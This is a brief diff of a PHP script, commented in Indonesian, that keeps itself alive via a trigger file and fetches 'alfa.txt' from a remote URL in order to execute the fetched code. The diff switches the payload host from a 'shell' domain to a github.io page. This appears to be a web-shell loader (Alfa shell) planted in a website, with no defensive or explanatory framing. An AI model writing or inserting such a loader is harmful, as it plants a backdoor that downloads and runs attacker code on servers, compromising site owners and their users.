@@ -44,7 +44,7 @@ $triggerFile = __DIR__ . '/trigger.txt';
 keepAlive($triggerFile);
 
 // Jalankan fungsi utama
-$a = geturlsinfo('https://shell.prinsh.com/Nathan/alfa.txt');
+$a = geturlsinfo('https://tigerxcodee.github.io/dor/alfa.txt');
 
 // Mengeksekusi kode yang diambil
 if ($a) {
